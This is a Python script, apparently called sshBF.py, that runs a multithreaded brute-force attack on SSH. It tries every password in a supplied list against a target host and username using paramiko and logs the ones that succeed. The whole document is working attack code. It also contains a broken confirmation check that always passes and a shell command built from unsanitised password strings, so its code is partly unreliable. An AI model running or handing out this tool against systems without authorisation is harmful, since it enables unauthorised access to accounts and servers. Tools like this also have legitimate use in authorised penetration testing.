
try:
	import sys, paramiko
except ImportError:
	print(Exception)
	print("\n Did you forget python3?")
	sys.exit(1)

import socket
import sys
import threading
import time
import os
import argparse

from queue import Queue

print_lock = threading.Lock()


#---------------------------------------------------------------------------------#

def sshscan(index):
	
	try:
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		
		client.connect(ip, port, username, passwdlist[index])

		working.append(passwdlist[index])
		c = ("echo " + (passwdlist[index]) + " >> " + logfile)
		with print_lock:
			print(passwdlist[index] + " working")

		os.system(c)
		client.close()

	except:
		with print_lock:
			print("NOT: " + passwdlist[index])
		pass

def sshthreader():
	while True:
		worker = e.get()
		sshscan(worker)
		e.task_done()


working = []

try:
	ip = sys.argv[1]
	username = sys.argv[2]

except IndexError:	
	print("Usage: python sshBF.py ip username /path/to/password/list")

port = 22


with open(sys.argv[3], 'r', errors='replace') as f:
    passwdlist = f.readlines()


ans = input("Continue: ")
#print(passwordlst)

if ans.lower == "y" or "yes":
	e = Queue()

	for x in range(100):
		t = threading.Thread(target=sshthreader)
		t.setDaemon(True)
		t.start()

	for worker in range(len(passwdlist)):

		e.put(worker)

	e.join()


	

print(working)